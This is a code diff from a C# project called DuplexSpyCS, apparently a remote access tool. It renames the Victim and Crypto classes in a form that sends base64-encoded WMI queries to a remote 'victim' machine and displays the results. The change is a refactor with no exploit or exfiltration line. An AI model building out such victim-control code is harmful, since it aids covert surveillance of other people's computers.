@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmWMI : Form
     {
-        public Victim v;
+        public clsVictim v;
         private int idx_prompt;
 
         public frmWMI()
@@ -26,11 +26,11 @@ namespace DuplexSpyCS
             List<string[]> rows = new List<string[]>();
             foreach (string d1 in data.Split(','))
             {
-                string d2 = Crypto.b64D2Str(d1);
+                string d2 = clsCrypto.b64D2Str(d1);
                 List<string> tmp = new List<string>();
                 foreach (string d3 in d2.Split(','))
                 {
-                    string d4 = Crypto.b64D2Str(d3);
+                    string d4 = clsCrypto.b64D2Str(d3);
                     string[] s = d4.Split(';');
                     if (!columns.Contains(s[0]))
                         columns.Add(s[0]);
@@ -80,7 +80,7 @@ namespace DuplexSpyCS
         {
             int idx_current = richTextBox1.Text.Length;
             string query = richTextBox1.Text[idx_prompt..idx_current];
-            v.encSend(2, 0, "wmi|" + Crypto.b64E2Str(query));
+            v.encSend(2, 0, "wmi|" + clsCrypto.b64E2Str(query));
         }
 
         void setup()
